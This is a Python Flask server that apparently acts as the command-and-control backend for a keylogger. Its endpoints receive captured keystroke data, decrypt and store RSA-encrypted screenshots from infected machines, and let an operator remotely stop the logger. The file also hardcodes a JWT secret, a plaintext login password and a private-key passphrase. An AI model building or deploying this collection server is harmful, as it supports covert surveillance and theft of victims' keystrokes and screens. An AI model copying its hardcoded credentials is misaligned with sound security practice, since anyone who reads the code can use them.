import os
import ssl
import base64
from PIL import Image
from io import BytesIO
from flask import Flask, request, make_response
from flask_jwt_extended import JWTManager, jwt_required, create_access_token
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA3_512

app = Flask(__name__)
# Replace with your own secret key
app.config['JWT_SECRET_KEY'] = 'xzuh-MdSdgFuSgWrg-NgyZZEmXQdXo6T7lrC56MIxLc'
jwt = JWTManager(app)

stop_flag = False  # Global flag to indicate whether the keylogger should stop

users = {
    'john': 'password123',
}


def decrypt_rsa(encrypted_blob, private_key_path, passphrase):
    try:
        with open(private_key_path, 'rb') as f:
            private_key = RSA.import_key(f.read(), passphrase=passphrase)
            cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA3_512)
            decrypted_message = cipher.decrypt(encrypted_blob)
            return decrypted_message.decode('utf-8')
    except Exception as e:
        print("Decryption error:", e)
        return None


@app.route('/upload', methods=['POST'])
@jwt_required()  # Requires JWT authorization
def upload():
    if 'debug' in request.args:
        print(request.data)
    else:
        print("Data received")
    return 'Data received', 200


@app.route('/info', methods=['POST'])
@jwt_required()  # Requires JWT authorization
def info():
    print(request.data)
    return 'OK', 200


@app.route('/stop_keylogger', methods=['POST'])
@jwt_required()  # Requires JWT authorization
def stop_keylogger():
    global stop_flag
    stop_flag = True
    return 'Keylogger stopped', 200


@app.route('/check_stop_flag', methods=['GET'])
@jwt_required()  # Requires JWT authorization
def check_stop_flag():
    global stop_flag
    return str(stop_flag), 200


# Route to authenticate the user and generate JWT token
@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')

    if not username or not password:
        return {'message': 'Invalid credentials'}, 401

    if username not in users or users[username] != password:
        return {'message': 'Invalid credentials'}, 401

    # User authentication successful, generate JWT token
    access_token = create_access_token(identity=username)

    return {'access_token': access_token}, 200


@app.route('/upload_image', methods=['POST'])
@jwt_required()  # Requires JWT authorization
def upload_image():
    data = request.get_json()

    if 'filename' not in data or 'image' not in data:
        return 'Invalid request', 400

    filename = data['filename']
    image_data = data['image']

    try:
        # Decrypt RSA encrypted image data
        private_key_path = 'G:/Meine Ablage/Hacking mit Python/python-keylogger-master/private_key.pem'
        passphrase = 'geheimespasswort'
        encrypted_blob = base64.b64decode(image_data)
        decrypted_data = decrypt_rsa(
            encrypted_blob, private_key_path, passphrase)
        if decrypted_data is None:
            return 'Failed to decrypt image', 500

        # Create a PIL Image object from the decrypted base64 data
        image_bytes = base64.b64decode(decrypted_data)
        image = Image.open(BytesIO(image_bytes))

        # Save the image
        screenshots_directory = os.path.join(os.getcwd(), "screenshots")
        if not os.path.exists(screenshots_directory):
            os.makedirs(screenshots_directory)

        filepath = os.path.join(screenshots_directory, filename + ".png")
        image.save(filepath, "PNG")

        return 'Image uploaded successfully', 200
    except Exception as e:
        print("Error:", e)
        return 'Failed to process image', 500


@app.errorhandler(404)
def not_found(error):
    html = '''
    <!doctype html>
    <html lang="en">
    <head>
        <title>404 Not Found</title>
    </head>
    <body>
        <h1>Not Found</h1>
        <p>The requested URL was not found on the server. If you entered the URL manually, please check your spelling and try again.</p>
    </body>
    </html>
    '''
    response = make_response(html, 404)
    response.headers['Content-Type'] = 'text/html'
    return response


if __name__ == '__main__':
    """ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.load_cert_chain(
        certfile="G:/Meine Ablage/Hacking mit Python/certificate.crt",
        keyfile="G:/Meine Ablage/Hacking mit Python/private_key.key",
        password='geheimespasswort')"""

    app.run(host='0.0.0.0', port=4000) #, ssl_context=ssl_context)
